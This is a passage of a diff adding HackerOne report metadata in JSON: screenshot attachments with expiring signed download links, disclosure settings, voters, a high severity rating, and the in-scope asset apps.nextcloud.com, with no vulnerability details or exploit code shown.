+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/361/01511e5bc928594348ec04b2dd96ff33163b7032/Screen_Shot_2019-04-23_at_5.54.31_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.54.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.54.31_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8e0f2ff981c470347b28f86a2b112e9fbbbd25cf04d70ed4129cc43f1155de11",
+      "file_size": 145635,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 474362,
+      "file_name": "Screen_Shot_2019-04-23_at_5.55.31_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/362/a07e9858f5a275585787b9fc4feb785c16337f6b/Screen_Shot_2019-04-23_at_5.55.31_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.55.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.55.31_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7FSCVMF7%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQDUthnfJs9BDdavfKxuzlWyn92EPuL%2Br7WHazAoqfxapAIgA4Uo6vD2ROnHy3IkcdAQOVqIGOVW3I5S0vc0IKPK4nkqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAGnIHavIhntGQBMqyqOBeT43CfYMGcNPBYettkzOa616QbsPUWnOPBL9RbcApgC7pQSfY%2FZmkrHoRQok80HEfAHc2xdAGyB%2BZ3U0bc69S5C6jdUrUE%2BSsS6JTmfvVcIH1I8tm1K2%2FBvmHLJ5humAE80puAaaxQHIAAkY6K5yFquTCUvNw9RJYxVkcZW2t4GjYV7wu2FT94s6yFdILWtG9CI%2BXKfWrlgyrKaqtivvJvMtgJplTzuXnO5ZEe3Fp9MrP1zcFTiqipG3C3PIyxRWEct%2B5jhCJk12UgjGsg6fqRBeLNEfQt7XCx6B6MlJFVKUf1rH%2Fufa3NqrngZ1F%2FI9oHxlf1%2B5H%2B5XtyGUMTzD0JtcZTH8lMqu8yaSFVCh0NqZTxZ4E4uibqZQrLMlZAbxStkujtYL8i7BXkzMzrOemVrkjCdfEtREnDdikIGxh4jPHaGuTkRNp%2B%2Fl6%2Fz1TsKvK43PyGT6f%2BF9a2HDKRQuZzPTOVC7g4YC06zhXVGSOgXfsd%2FDW%2BRITCHC99GPNTUsCPSiPhReT6uf92JWnpfDh8Ne3oYonoCjDjo58aCW12uqY5h7wuW9N29CO2dfBSD1hr983r6Ie2vVU16jcYptxsvKojDNv1JKIO%2FXompKnNzwnUFrbFm2bbEcTwP%2BrG6k2VZ9wL8w8%2FDi1cD19dqULREUjIl%2FcC02spFRUC7Hc%2FGtH7%2Bllbp7OF8VZQe3T42RHhMefzSD6pMiHDCdy7U8ppsVbVHffQUku%2FfEULDn4ZL0U%2FcHj1Nx93DLXyYIJcoCvgojCD2ILJNSkgVwrDK1DZTmb5P0PxDZvRe2Z%2Bvf0KdFAcSi3PkqadLqGK1vOcanSkOri85l%2FCc63GVnTKkb0tOD0hQ2u78YplFWoCEmDC4mv3PBjqxAY%2FT2y1qy2P8JMynQruhIqTciGfXEMg8lAtWEmEO4naOO2%2FKuOmK38iS4fJGDkv4nkp0c%2FXYmWw0121MiHkfGJIT1M19p3eLc3C%2BbuG6c1VN6NSrpCRfVVR8OCQTBg8c4Ql6rQ%2BCN7NPW2w5cUFORL4Gw4G90xx2owGK1ErKsRTRnzBIhP43WBMwNISVz4XJ8Tb5WJiK854spf9fv%2FlQEtWnEENXEd7YCxNPHDvOLn%2FXOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=255e22a86747a94ebc6ee2a0d21af444c70a05c650acf6b6f40b485c3f4913bd",
+      "file_size": 309311,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-05-30T07:17:00.340Z",
+  "allow_singular_disclosure_after": -219139521.1985457,
+  "singular_disclosure_allowed": true,
+  "vote_count": 124,
+  "voters": [
+    "orange303",
+    "mirchr",
+    "debsec",
+    "w31rd0",
+    "p1stachios",
+    "foobar7",
+    "pendorchointerestelar",
+    "base_64",
+    "steveflex",
+    "ta8ahi",
+    "and 114 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42,
+    "asset_type": "URL",
+    "asset_identifier": "apps.nextcloud.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
